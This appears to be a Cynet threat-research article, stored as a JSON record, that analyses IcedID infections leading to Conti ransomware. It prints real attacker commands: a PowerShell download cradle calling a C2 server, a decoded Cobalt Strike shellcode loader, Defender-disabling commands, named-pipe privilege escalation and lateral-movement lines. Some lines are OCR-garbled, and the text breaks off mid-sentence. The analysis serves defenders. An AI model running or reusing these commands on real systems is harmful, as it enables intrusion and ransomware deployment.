{
    "id": "800d2721-6478-4c54-bf18-0f6de5533391",
    "created_at": "2023-01-12T15:03:08.128954Z",
    "updated_at": "2025-03-27T02:14:12.236904Z",
    "deleted_at": null,
    "sha1_hash": "bbde6df3e7caec53d524040526b1d9521c682100",
    "title": "2021-06-30 - Shelob Moonlight – Spinning a Larger Web From IcedID to CONTI, a Trojan and Ransomware collaboration",
    "authors": "",
    "file_creation_date": "2022-05-28T15:36:42Z",
    "file_modification_date": "2022-05-28T15:36:42Z",
    "file_size": 7589245,
    "plain_text": "# Shelob Moonlight – Spinning a Larger Web\n\n**cynet.com/attack-techniques-hands-on/shelob-moonlight-spinning-a-larger-web/**\n\n## Shelob Moonlight – Spinning a Larger Web\n From IcedID to CONTI, a Trojan and Ransomware collaboration\n\nBy Max Malyutin – Sr. Threat Researcher\n\n## Introduction\n\nCynet’s research and CyOps teams constantly work together to track the malicious activities of threat groups. Advanced threat groups that\ntarget organizations for financial gain frequently modify their TTPs and alter their malware to evade defenses. In this article, we detail how two\ndifferent threat groups – Lunar Spider and Wizard Spider – have joined forces to infect organizations with CONTI ransomware.\n\n**IcedID, a Trojan banker developed by threat group Lunar Spider, is primarily used to steal and exfiltrate financial information. This Trojan is**\n**now being used as a downloader to distribute Conti Ransomware, developed by Wizard Spider, to compromised organizations.**\n\nIn other words, two different independent malwares, developed by two different attack groups – are collaborating to download, spread and\ninfect compromised organizations with ransomware.\n\n**During the last few months, Cynet 360 detected a high number of IcedID infections utilizing Cobalt Strike beacons and ultimately**\n**attempting to encrypt hosts using CONTI ransomware. If you suspect that your company’s devices are infected with IOC or TTPs relevant**\nto this article, please reach out directly to Cynet for help with evaluating an incident response. Cynet’s MDR team, CyOps, is available 24×7\nand ready to help you begin threat hunting.\n\n## IcedID overview\n\nIcedID (A.K.A BokBot); [IcedID – ID: S0483 was first observed in the wild in September 2017 and was classified as a banking trojan malware](https://attack.mitre.org/software/S0483/)\ndesigned to target financial sectors in the U.S and Europe. The malware allows threat actors to steal financial information, banking\ncredentials, and payment information using web injection and browser hooking techniques.\n\nFrom 2017 to 2021, the threat group behind IcedID used multiple attack techniques and upgraded the range of malicious capabilities to evade\ndetection and deploy massive attack campaigns. The IcedID Threat group shifted the malware’s modus operandi, remaking it from a banking\n[trojan and into an application capable of distributing additional sophisticated threat tools like Cobalt Strike and ransomware like MAZE,](https://attack.mitre.org/software/S0154/)\nEGREGOR, Sodinokibi, and CONTI.\n\nWith this change, IcedID became part of the Malware-as-a-Service (MaaS) organized cybercrime.\n\n\n-----\n\n## IcedID modus operandi:\n\nSpear phishing attachment distribution via malspam campaigns (zipped, weaponized Microsoft office documents)\nUser execution via enabling macros\nDLL download from C2 server\nLoader DLL execution via rundll32\\regsvr32; LOLbins (Living Off the Land Binaries)\nFingerprinting and enumeration of the compromised machine\nC2 server connection, send initial information\nInitial access for sophisticated threats (downloader activity)\n\nIcedID’s popularity has increased significantly, even surpassing the infamous Emotet (see Once upon a time in Troy – Emotet malware, a\n[trojan evolution), which is often described as “the world’s most dangerous malware.” Emotet was taken down at the end of January 2021 by a](https://www.zdnet.com/article/emotet-worlds-most-dangerous-malware-botnet-disrupted-by-international-police-operation/)\nmajor law enforcement operation coordinated between multiple authorities including Europol, the FBI, and the UK’s National Crime Agency,\nalong with agencies from Canada, France, Germany, Lithuania, the Netherlands, and Ukraine.\n\n## IcedID associated threat groups\n\n[GOLD CABIN aka: Shakthak, TA551](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=TA551%2C%20Shathak&n=1)\n\n[LUNAR SPIDER aka: GOLD SWATHMORE](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Lunar%20Spider&n=1)\n\nThe TA551 and LUNAR SPIDER threat groups are classified as eCrime groups with a primary motivation of targeting financial organizations.\nThese eCrime groups are associated with various malware, including IcedID, Qakbot, Ursnif, and Valak. The unique pattern of these groups\nlies within their kill chain method, comprised of weaponized Office documents (Excel and Word) which are usually contained in a passwordprotected zipped file and distributed throughout a malspam campaigns via email. Once these weaponized documents are opened, additional\nmalware is either downloaded to the host – in most cases in the form of DLL payloads executed via Microsoft legitimate binaries (LOLBins).\n\n## CONTI Overview\n\n[CONTI (MITRE ID: S0575) is a new ransomware observed in the wild starting in late 2020 and has become a major target for the FBI. On](https://attack.mitre.org/software/S0575/)\n[May 20, 2021, the FBI released an article discussing the impact of CONTI ransomware on healthcare, law enforcement agencies, and](https://www.aha.org/system/files/media/file/2021/05/fbi-tlp-white-report-conti-ransomware-attacks-impact-healthcare-and-first-responder-networks-5-20-21.pdf)\nemergency medical services in the US.\n\nThe CONTI group operates as Ransomware-as-a-Service (RaaS) affiliated with WIZARD SPIDER threat group. Cynet has recently observed\n[CONTI targeting organizations in the US and Europe. The NCSC (National Cyber Security Centre) has recently participated in recent CONTI](https://www.ncsc.gov.ie/pdfs/HSE_Conti_140521_UPDATE.pdf)\ninfection investigations on account of recent news of CONTI wreaking havoc in among different victims:\n\n[“Exagrid pays $2.6m to Conti ransomware attackers”](https://www.computerweekly.com/news/252501665/Exagrid-pays-26m-to-Conti-ransomware-attackers)\n\n[“Conti Ransomware Hack: FBI Says 16 U.S. Networks Have Been Hacked This Year”](https://www.newsweek.com/latest-updates-conti-ransomware-hack-fbi-says-16-us-networks-have-been-hacked-this-year-1596586)\n\n[“Conti ransomware syndicate behind attack on Irish health service”.](https://www.computerweekly.com/news/252500905/Conti-ransomware-syndicate-behind-attack-on-Irish-health-service)\n\n## Cynet to the rescue\n\nCynet recently responded to a number of incidents in several companies asking for Cynet assistance where IcedID infection eventually\nimpacted the compromised network with CONTI ransomware and where CONTI encryption note was presented on all computers.\n\n\n-----\n\nu g t e oot cause a a ys s o t e pacted et o s, e a e co c uded t at t e t a access ecto CO a so a e attac s as\na malspam campaign delivering malicious email containing a zipped file, followed by a weaponized Office document downloading the IcedID\nmalware. The IcedID malware, in turn, launched a Cobalt Strike beacon on the compromised machine which in turn executed discovery\ncommands on the domain while abusing Windows legitimate binaries.\nThe next steps of the infection included privilege escalation and lateral movement activities.\nOnce the attackers established persistence on the domain, a CONTI ransomware variant was dropped.\n\n[This is further evidence that the LUNAR SPIDER and WIZARD SPIDER groups are breaking bread – it is clear evidence that they have](https://attack.mitre.org/groups/G0102/)\ncoordinated the distribution of each other’s malware.\n\n## MITRE ATT&CK TTPs Mapping\n\n\n-----\n\n## Technical analysis\n\n### Entry point\n\nThe infection chain of IcedID begins through an email vector (TA551 A.K.A Shathak is a malspam distribution campaign), by using spear\nphishing emails.\n\n\n-----\n\nThese emails are sent as part of phishing campaigns and contain malicious Microsoft documents (weaponized Office files) or a password\nprotected .zip file. This file contains either an MS Word document or Excel spreadsheet which leads to execution of multi-stage malicious\nactions.\n\nBelow, you can see an example demonstrating how the weaponized document execution looks like:\n\nGrandparent Process:\n\nc:\\program files (x86)\\microsoft office\\root\\office16\\outlook.exe\n\nParent Process Details:\n\n“C:\\Program Files\\7-Zip\\7zFM.exe” “C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\82QPK64D\\request\n(002).zip”\n\nProcess Details:\n\n“C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE” /n “C:\\Users\\*\\AppData\\Local\\Temp\\7zO77B8.tmp\\fatti-03.21.doc”\n/o “”\n\nIn this case, the .zip file contains a weaponized Microsoft Office document. The document asks the user to click on the “Enable Content”\nfeature, thus allowing the document to execute code stored as a macro. Demonstrated in the screenshot below:\n\n\n-----\n\nMD5: e51d7a4db66d3ea986343fe3e221b7fc\nSHA-256: f578d6e7fc4d204ef17549be7ea8f3b6bca4b4103e7afff483b180f95f818a20\n\nFile type: Office Open XML Document\n\nMagic: Zip archive data, at least v2.0 to extract\n\nAlternatively, the zip file may contain a spreadsheet document. As in the case of the Word document, the spreadsheet file also asks the user\nto click on the “Enable Content” to execute the malicious macro, as can be seen in the following screenshot:\n\nMD5: d15d140f0d5d88542d059ecd483dee38\nSHA-256: db66539408a53e25bf005990c1b868ef140303d2ccfa6964b63b26b6bfc1b07b\n\nFile type: Office Open XML Spreadsheet\n\nMagic: Zip archive data, at least v2.0 to extract\n\nIn both cases of malicious attachments, the unique aspect of these documents, either Word document or spreadsheet document, is that both\npresent a fake template to lure the user to allow “Enable Content” and “Enable Editing”.\n\n\n-----\n\no t s po t, e s o t e est gat o steps o t e sp eads eet docu e t, a t oug t e e ecut o o o t e o d docu e t s t e\nsame.\n\nOnce “Enable Content” is clicked, three instances of rundll32.exe are spawned:\n\nAdditionally, the Excel file communicates with three different C2 (Command & Control) servers to download an IcedID DLL file. The\ncommunication achieved by the malicious macros is stored in the weaponized Office document:\n\nThe C2 servers are:\n\n190[.]14[.]38[.]106\n193[.]38[.]54[.]246\n\n51[.]89[.]73[.]152\n\nInspecting the GET packet to these C2 servers can be seen in the following image:\n\nThe weaponized Office documents have a highly obfuscated VBA/XLM code and AutoOpen or AutoClose functions for its execution.\nIcedID Excel spreadsheet documents use Excel 4.0 (XLM) macros which leading to download and execution of the IcedID DLL payloads.\n\n\n-----\n\nced t eat acto s a e ut g de e se e as o a d a t a a ys s tec ques to de t e a c ous ac os, to e ade secu ty e do s, a d\nto make the analysis of the malicious document complex.\nExcel supports Macros 4.0 formulas by using formulas in spreadsheet cells. This type of macros allow the threat actors to bypass the\ndetections which including the Microsoft AMSI provider.\n\n[Microsoft published on March 3, 2021, an update “New runtime defense against Excel 4.0 macro malware” which provided details regarding](https://www.microsoft.com/security/blog/2021/03/03/xlm-amsi-new-runtime-defense-against-excel-4-0-macro-malware/)\nthe Antimalware Scan Interface (AMSI) integrated with Office 365 which includes the runtime scanning of Excel 4.0.\n**From our observations, most of the infections were performed on older versions of Microsoft Office.**\n\n**Bottom line – Many users are still using older versions of MS-Office and are vulnerable and exposed to attacks which utilize Excel with**\nMacro 4.0, up until Microsoft’s March update, attackers were able to attack O365 users since the AMSI provider couldn’t identify and detect\nthese malicious Macros formulas.\n\nThese techniques include:\n\nHiding sheets in the document\nHiding Excel 4.0 macros in different sheets\nHiding the macro formula by applying a white font color\n\nThe following image shows hidden malicious sheets:\n\nOn further examination of the hidden malicious sheets (OSN), we have observed that the macros color settings were set to white, allowing\nmaldoc to hide the macros formulas in the document.\n\nIn the Pervi sheet, we have observed the C2 server communication method to the three C2 IPs which were mentioned previously in the\narticle. The threat actors use the URLDownloadToFile API to connect the C2 servers which download the 3 files (DLLs) to the disk.\n\nsobr1 sheet is responsible for the execution of the downloaded DLL files via a rundll32.exe command line parameter that uses\nDllRegisterServer function\n\n\n-----\n\ne ac o code e e tua y do oads t ee s, asque ad g t e se es t a a do e te s o, a d e ecutes eac o e us g\nrundll32.exe.\n\n**First stage DLLs act as initial collectors and send the information to the C2 server to start the installation of the next attack phase.**\n\nThe command line for loading these DLLs is as follows:\n\n“rundll32 ..[Dll Name].[Random Extension],DllRegisterServer”\\\n\nIn other cases (not detailed in this article), we also detected IcedID DLL execution via the regsvr32.exe binary.\n\nregsvr32 execution example:\n\n“C:\\Windows\\System32\\regsvr32.exe” c:\\users\\public\\globalStorage.jpg\n\nBetween April 6 and May 26, Cynet detected the following IcedID campaigns, with different DLLs extensions:th th\n\nrundll32 command execution that detected by Cynet 360:\n\nMay 26 2021 rundll32 ..\\Hikos.hertolo1,DllRegisterServer\nMay 26 2021 rundll32 ..\\Hikos.hertolo,DllRegisterServer\n\nMay 25 2021 rundll32 ..\\iroto.tio1,DllRegisterServer\n\nMay 25 2021 rundll32 ..\\iroto.tio,DllRegisterServer\n\nMay 24 2021 rundll32 ..\\Hikos.hertolo2,DllRegisterServer\n\nMay 24 2021 rundll32 ..\\svvhos.dati4,DllRegisterServer\n\nMay 20 2021 rundll32 ..\\durio.fur,DllRegisterServer\n\nMay 17 2021 rundll32 ..\\bubl.cmi1,DllRegisterServer\n\nMay 17 2021 rundll32 ..\\bubl.cmi,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\lertio.cersw,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\tuti.rut,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\tuti.rut1,DllRegisterServe\n\nMay 13 2021 rundll32 ..\\dtfhdtr.ert,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\wiroe.oer5,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\wiroe.oer4,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\wiroe.oer2,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\wiroe.oer3,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\wiroe.oer1,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\nvcoerf.vlb4,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\nvcoerf.vlb,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\nvcoerf.vlb1,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\nvcoerf.vlb3,DllRegisterServer\n\nMay 13 2021 rundll32 ..\\nvcoerf.vlb2,DllRegisterServer\n\nMay 11 2021 rundll32 ..\\ikjcvesdv.ref,DllRegisterServer\n\nMay 5 2021 rundll32 ..\\svvhos.dati3,DllRegisterServer\n\nMay 5 2021 rundll32 ..\\svvhos.dati2,DllRegisterServer\n\nMay 5 2021 rundll32 ..\\svvhos.dati1,DllRegisterServer\n\nMay 5 2021 rundll32 ..\\svvhos.dati,DllRegisterServer\n\nMay 20 2021 rundll32 ..\\Hikos.hertolo,DllRegisterServer\n\nApr 28 2021 rundll32 ..\\Butyo.vikas,DllRegisterServer\n\nApr 26 2021 rundll32 ..\\jjoputi.vvt1,DllRegisterServer\n\n\n-----\n\np jj p, g\n\nApr 23 2021 rundll32 ..\\duron.bnm1,DllRegisterServer\n\nApr 21 2021 rundll32 ..\\ghnrope.ito1,DllRegisterServer\n\nApr 20 2021 rundll32 ..\\Klos.viters1,DllRegisterServer\n\nApr 20 2021 rundll32 ..\\Klos.viters,DllRegisterServer\n\nApr 20 2021 rundll32 ..\\Klos.viters2,DllRegisterServer\n\nApr 13 2021 rundll32 ..\\Hodas.vyur2,DllRegisterServer\n\nApr 13 2021 rundll32 ..\\Hodas.vyur1,DllRegisterServer\n\nApr 13 2021 rundll32 ..\\Hodas.vyur,DllRegisterServer\n\nApr 6 2021 Rundll32 ..\\Kiod.hod1,DllRegisterServer\n\nApr 6 2021 Rundll32 ..\\Kiod.hod2,DllRegisterServer\n\nApr 6 2021 Rundll32 ..\\Kiod.hod,DllRegisterServer\n\nFor this article, we have analyzed a IcedID DLL file that acts as the installer.\n\n## IcedID sample analysis\n\nMD5: 4474dd4c14f76b6b40f855b9aae628fa\nSHA-256: 93e5fc51525d584a80db2505638f0f9237bff8d01adc330049a414b45c7a811c\n\nImphash: 78ed290a779aa51d4473678936319a48\n\nSSDEEP: 768:GGS/PPJ69K2c5r8OsDBZpAYqRHAZorOs1gxuqkB1chYsNbp6SGu4nQvxVH2oOB4:yPRESOn+YC1ZB1chYsNl6SWn+Lc4\n\nFile type: Win32 DLL\n\nMagic: PE32+ executable for MS Windows (DLL) (GUI) Mono/.Net assembly\n\nEntropy: 7.302\n\nExports:\n\nDllRegisterServer\nPluginlnit\n\nBy setting breakpoints on VirtualAlloc, we unpacked the IcedID payload. An allocated memory section was created with null bytes and the\nunpacked payload is written in this section.\n\nThe below section is responsible for the unpacking routine:\n\n\n-----\n\nThe memory page of the unpacked IcedID has ERW privileges (Execute, Read, Write, protection rights).\n\nThe unpacked IcedID file contains various HTTP APIs.\n\nUsing IDA, we can see that the unpacked IcedID payload uses an HTTP APIs to retrieve a connection with the C2 server in the code:\n\n\n-----\n\nThe IceID loader retrieves information on the compromised host by performing initial enumeration and fingerprinting. It then sends the\ninformation to the C2 server via the HTTP APIs mentioned above.\n\nThe information includes the OS version, username, computer name and physical address. The information is sent in an encoded cookie to\nthe C2 server.\n\nThe packet inspection of the HTTP cookie sent to the C2 server:\n\n\n-----\n\nExamining the packet also reveals a DNS name for the C2: dsedertyhuiokle[.]top.\n\nExample of cookie names and order:\n\nCookie:\n__gads\n\n_gat= OS version\n\n_ga= CPU\n\n_u= Computer name and the username\n\n__io= User SID\n\n_gid= MAC\n\n**Hunting tip: external socket with the above data could be an indicator of IcedID activity.**\n\nThe CPU ID check, performed by using the cpuid instruction which allows to query the processor information and the CPU type. This\ninformation stored in _ga:\n\n\n-----\n\nThe OS version check performed by using the RtlGetVersion function which holds the OS version information. This information is stored in\n_gat:\n\nThe user SID check, performed by using the LookupAccountNameW function which holds the name of a system, an account, and the security\nidentifier (SID). This information stored in _io:\n\n\n-----\n\nUsername and Computer name check, performed by using the GetUserNameA and GetComputerNameA functions which retrieve the\nusername and the NetBIOS name. This information stored in _U:\n\n\n-----\n\nAdapter Info check, performed by using the GetAdaptersInfo function which retrieves adapter information that is stored in _gid:\n\n\n-----\n\n## Cobalt Strike\n\nAfter the execution of the first stage loader, the C2 server responds with a fake GZIP payload which is an encrypted IcedID payload. This\nencrypted payload is downloaded as license.dat which is a core module of IcedID. Next, license.dat is executed via rundll32.exe:rundll32.exe\n\n“C:\\Users\\*\\AppData\\Local\\Qiik\\cuucuy\\Agmupn.dll”,update /i:”BarelyHedgehog\\license.dat”\n\nFollowing the execution of license.dat, the next step uses [process Injection, which enables IcedID to evade defenses by migrating from](https://attack.mitre.org/techniques/T1055/)\ncmd.exe to rundll32.exe. This specific process injection technique is indicative of Cobalt Strike, eventually allowing the threat actor to gain full\nremote control over the compromised machine.\n\nParent Process Details:\n\nrundll32.exe “C:\\Users\\*\\AppData\\Local\\Qiik\\cuucuy\\Agmupn.dll”,update /i:”BarelyHedgehog\\license.dat”\n\nProcess Details:\n\nC:\\Windows\\SysWOW64\\cmd.exe\n\nTarget (injected) Process:\n\nc:\\windows\\system32\\rundll32.exe\n\nThe injected data:\n\n\n-----\n\nMZARUH\\x89\\xe5H\\x81\\xec\n\\x00\\x00\\x00H\\x8d\\x1d\\xea\\xff\\xff\\xffH\\x81\\xc3\\xcc\\t\\x00\\x00\\xff\\xd3H\\x89\\xc3I\\x89\\xf8h\\x04\\x00\\x00\\x00Z\\xff\\xd0A\\xb8\\xf0\\xb5\\xa2Vh\\x05\\x00\\x\nprogram…\n\nInjection page info:\n\nState=MEM_COMMIT, Type=MEM_MAPPED, AllocationProtect=PAGE_EXECUTE_READWRITE, RegionSize=135168\n\nCobalt Strike then downloads two additional payloads:\n\nc:\\users\\*\\appdata\\local\\temp\\xugi64.exe\nFile SHA256: 48385CB94B871E3BF46BD1ABFACF1CD69155A0161D2D200ECEBD333A7FF137E8\n\nC:\\users\\*\\appdata\\local\\temp\\ovuleq.exe\nFile SHA256: 668FCD27F21503184B9E6E10EDB9C9E5C6BA1484EBC60A33A7E6104CA4857561\n\nThese two executables also serve as Cobalt Strike beacons.\n\nAdditionally, we have also detected Cobalt Strike injecting code to these processes:\n\nc:\\windows\\system32\\svchost.exe\nc:\\windows\\system32\\wuauclt.exe\n\nc:\\windows\\system32\\mstsc.exe\n\nc:\\windows\\system32\\dllhost.exe\n\nWe have also observed, that these injected processes do not have command line parameters, which is a great indicator for detection. For\nexample, mstsc.exe or svchost.exe without command line parameters is very uncommon and does not make any sense for these processes.\n\nCobalt Strike also utilizes PowerShell execution to perform a fileless shellcode injection.\n\nThe initial PowerShell command:\n\npowershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘http://23[.]108[.]57[.]148:80/a443’))”\n\nThe next stage PowerShell script is stored behind the Cobalt Strike C2 server.\n\nThe PowerShell script is encoded in Base64 format.\n\npowershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgA……\n\nThe decoded base64 command:\n```\n$s=New-Object IO.MemoryStream(,\n[Convert]::FromBase64String(\"H4sIAAAAAAAAAK1Xa3Oiyhb9HH8FH1KlVoxBUWPm1FQNCCgoRMB3TirFo1W0eQiNSs7Mfz8b1JzMmeTeqbo3VVaaZr967bV3bwxEbg\n (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n\n```\n\n-----\n\nSet-StrictMode -Version 2\n$DoIt = @’\n\nfunction func_get_proc_address {\n\nParam ($var_module, $var_procedure)\n\n$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.S\n\n$var_gpa = $var_unsafe_native_methods.GetMethod(‘GetProcAddress’, [Type[]] @(‘System.Runtime.InteropServices.HandleRef’, ‘string’))\n\nreturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-O\n\n}\n\nfunction func_get_delegate_type {\n\nParam (\n\n[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\n[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\n)\n\n$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(‘ReflectedDelegate\n\n$var_type_builder.DefineConstructor(‘RTSpecialName, HideBySig, Public’, [System.Reflection.CallingConventions]::Standard, $var_parameters\n\n$var_type_builder.DefineMethod(‘Invoke’, ‘Public, HideBySig, NewSlot, Virtual’, $var_return_type, $var_parameters).SetImplementationFlags(‘R\n\nreturn $var_type_builder.CreateType()\n\n}\n\n[Byte[]]$var_code =\n\n[System.Convert]::FromBase64String(’38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\n$var_code[$x] = $var_code[$x] -bxor 35\n\n}\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_\n\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Vo\n\n$var_runme.Invoke([IntPtr]::Zero)\n\n‘@\n\nIf ([IntPtr]::size -eq 8) {\n\nstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n\n}\n\nelse {\n\nIEX $DoIt\n\n}\n\nThe above script is base64-encoded and is also compressed with a GzipStream. By decoding the base64 format and decompressing the\nGzipStream with Gunzip, we observed the final stage of the PowerShell script.\n\nThe purpose of the function “func_get_proc_address” is to use a .Net API to call Windows API function in memory from system.dll and import\nGetModuleHandle and GetProcAddress, which is later used to call the VirtualAlloc function.\n\nThe [Byte[]]$var_code contains a base64 format string, which is the shellcode decrypted with xor using a key of 35.\n\n\n-----\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n$var_code[$x] = $var_code[$x] -bxor 35\n\n}\n\nThe shellcode is injected in the allocated space (VirtualAlloc allocated the space in the memory for the shellcode).\n\nFinally, the shellcode is executed in the allocated space inside the memory.\n\nThe injection is actually a self-injection, meaning the PowerShell instance that executed the command is injected and contains the shellcode.\n\nThe decrypted shellcode:\n\nüè.`.å1Òd.R0.R..R..r(.·J&1ÿ1À¬<a|., ÁÏ\n[.ÇâðRW.R..B<.Ð[email protected]ÀtJ.ÐP.H..X .Óã<I.4..Ö1ÿ1À¬ÁÏ](https://www.cynet.com/cdn-cgi/l/email-protection)\n\n.Ç8àuô.}ø;}$uâX.X$.Óf..K.X..Ó….Ð.D$$[[aYZQÿàX_Z..ë.]hnethwiniThLw&.ÿÕ1ÿWWWWWh:Vy§ÿÕé.\n\n[[1ÉQQj.QQh».SPhW..ÆÿÕëp[1Ò[email protected]ëU.;ÿÕ.Æ.ÃP1ÿWWjÿSVh-..{ÿÕ.À..Ã.1ÿ.öt..ùë](https://www.cynet.com/cdn-cgi/l/email-protection)\n[hªÅâ]ÿÕ.ÁhE!^1ÿÕ1ÿWj.QVPh·Wà.ÿÕ¿/9Çt·1ÿé..éÉ.è.ÿÿÿ/strap/[email protected],ú.ÊÂ))`]}.](https://www.cynet.com/cdn-cgi/l/email-protection)\n¤”.&¿C°1XË.6ÀÒÅN.z°9®.øøQâénú\\jÆeM…:é.ó.ÊêÐ\\îHost: code.jquery.com\n\nConnection: close\n\nAccept: */*\n\nAccept-Encoding: gzip, br\n\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2832.7 Safari/537.36\n\n.·¢.xÎ°fM\n\n[.|cÐfcyuT..Äpy§sÆ{.ÂÙà =GÒ.B¼~?¸¨ç.ºÀV.Õ[email protected]*óïØ¯ûýÒa:Wøõ.É{¹Ðy.o.ªÜè.](https://www.cynet.com/cdn-cgi/l/email-protection)\n[{ã4.XØpoÖ. .ê.Ùvü8¬6Mhðµ¢VÿÕ[email protected]@WhX¤SåÿÕ.¹.ÙQS.çWh SVh…âÿÕ.ÀtÆ…Ã.ÀuåXÃè©ýÿÿ23.108.57.148^.x.](https://www.cynet.com/cdn-cgi/l/email-protection)\n\nAccept: */*\nAccept-Encoding: gzip, br\n\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2832.7 Safari/537.36\n\nCobalt Strike C2 server:\n\n23.108.57[.]148\n\nAfter execution of the fileless injection with PowerShell, the threat actor performed an additional injection to a remote process utilizing a\nReflective DLL injection technique to an existing svchost.\n\nThis technique allows injecting a .DLL for the malicious process into the memory of a remote process, which allows threat actors to avoid\nEDR and traditional AV solutions detection as it is not storing a DLL file on disk and not calling Windows APIs LoadLibrary and LoadLibrary\n(classic DLL injection).\n\nPowerShell opens a handle with GrantedAccess 0x143A ( PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION,\nPROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION) to\nsvchost.\n\nTarget process:\n\nC:\\WINDOWS\\System32\\svchost.exe -k UnistackSvcGroup\n\nThe injected svchost executes a PowerShell command, which performs a discovery operation.\n\nPowershell -nop -exec bypass -EncodedCommand\nIgBbAFMAeQBzAHQAZQBtAC4ARABpAHIAZQBjAHQAbwByAHkAUwBlAHIAdgBpAGMAZQBzAC4AQQBjAHQAaQB2AGUARABpAHIAZQBjA\n\nDecoded command:\n\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | Select -property Name,IPAddress,OSVersion\n\n## Discovery\n\n\n-----\n\nced p e o s se e a d sco e y co a ds t at a e used by t e Coba t St e sess o\n\nipconfig /displaydns\nipconfig /all\n\nnltest /domain_trusts\n\nnltest /domain_trusts /all_trusts\n\nsysteminfo\n\nnet view /all /domain\n\nwmic product get name,version\n\nThe above discovery command (wmic product get name,version) is used to list the installed application on the host and understand which\nsecurity applications they are dealing with.\n\nThe following command prints the installation package.\n\nwmic product where “Name like ‘%Security Application%'” get Name, IdentifyingNumber\n\n## Impair Defenses\n\nAfter the discovery of the security applications installed, an attempt is made to uninstall the security application via the msiexec command:\n\nmsiexec.exe /x {[ security application package]} /qn\nmsiexec.exe /x {[ security application package]} /qn PASSWORD=[password]\n\n[Additionally, a “T1562.001: Impair Defenses: Disable or Modify Tools” – technique is used to disable Microsoft Defender:](https://attack.mitre.org/techniques/T1562/001/)\n\npowershell New-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender -Name DisableAntiSpyware -Value 1 PropertyType DWORD -Force\npowershell Uninstall-WindowsFeature -Name Windows-Defender\n\npowershell Set-MpPreference -DisableRealtimeMonitoring $true\n\npowershell Uninstall-WindowsFeature -Name Windows-Defender\n\nWe have also observed attempts to perform privilege escalation using GetSystem named pipes impersonation to gain SYSTEM level\nprivileges.\n\nC:\\Windows\\system32\\cmd.exe /c echo fbe08e37b62 > \\\\.\\pipe\\ab59fc\nC:\\Windows\\system32\\cmd.exe /c echo 99269f2c2e0 > \\\\.\\pipe\\4bba0e\n\nC:\\Windows\\system32\\cmd.exe /c echo fe08a9c446f > \\\\.\\pipe\\254573\n\nC:\\Windows\\system32\\cmd.exe /c echo 849b1389e6a > \\\\.\\pipe\\e215fc\n\nC:\\Windows\\system32\\cmd.exe /c echo [Random 11 characters] > \\\\.\\pipe\\[Random 6 characters]\n\n**Hunting tip: The above pattern of the GetSystem command could help in detecting privilege escalation attempts via named pipe. Also, the**\ncmd command executes via services.exe process which could be the second indicator.\n\n_“Technique 1 creates a named pipe from Meterpreter. It also creates and runs a service that runs cmd.exe /c echo “some data” >\\\\.\\pipe\\_\n\n_[random pipe here]. When the spawned cmd.exe connects to Meterpreter’s named pipe, Meterpreter can impersonate that security context._\n_Impersonation of clients is a named pipes feature. The context of the service is SYSTEM, so when you impersonate it, you become_\n_SYSTEM.” – Cobalt Strike_\n\nAfter the threat actors have enumerated the compromised host, mapped the inter-domain, disabled the security applications, and gained\nSYSTEM privileges, the system is compromised and ready for the final impact by CONTI ransomware.\n\n## Final Stage – CONTI Infection\n\nFor lateral movement and distribution of CONTI ransomware, threat actors are using C$ share.\n\nbitsadmin /transfer debjob /download /priority normal \\\\*\\C$\\Windows\\md.dll C:\\Windows\\ GROUP x86.dll\n\n\n-----\n\ntsad s a eg t ate c oso t do s b a y (used o a ag g bac g ou d te ge t t a s e ) abused by t eat acto s to a o\ndropping of the CONTI ransomware in the C$ share.\n\nThe execution method used to execute the CONTI DLL is regsvr32 command.\n\nc:\\windows\\syswow64\\regsvr32.exe /s C:\\Windows\\GROUP_x86.dll\n\nUsing 